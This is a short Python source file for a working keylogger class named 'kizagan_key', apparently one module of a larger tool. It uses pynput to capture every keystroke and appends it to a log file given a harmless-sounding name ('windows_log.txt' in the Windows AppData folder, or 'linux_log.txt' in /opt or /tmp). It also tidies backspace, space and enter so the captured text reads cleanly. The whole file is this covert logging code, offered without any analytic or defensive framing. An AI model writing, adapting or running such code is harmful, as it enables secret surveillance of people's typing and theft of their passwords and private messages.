from pynput.keyboard import Key, Listener
import os

class kizagan_key():
    def __init__(self):
        if os.name == "nt":
            self.key_file = os.environ["appdata"] + "\\windows_log.txt"
        else:
            try:
                key_file = open("/opt/linux_log.txt", "a")
                key_file.close()
                self.key_file = "/opt/linux_log.txt"
            except:
                self.key_file = "/tmp/linux_log.txt"
    
    def on_press(self, key):
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.space":
            key = " "
        elif key == "Key.backspace":
            try:
                key_file = open(self.key_file, "r")
                key_file_content = key_file.read()
                key_file.close()
                if key_file_content[-1] == "]":
                    pass
                else:
                    key_file_content = key_file_content[:-1]
                    key_file = open(self.key_file, "w")
                    key_file.write(key_file_content)
                    key_file.close()
            except:
                pass
            key = ""
        elif key == "Key.enter":
            key = "\n"
        elif key.startswith("Key."):
            splitted_key = key.split(".")
            key = f"[{splitted_key[1].upper()}]"
        key_file = open(self.key_file, "a")
        key_file.write(key)
        key_file.close()

    def start_key(self):
        with Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

    def stop_key(self):
        self.listener.stop()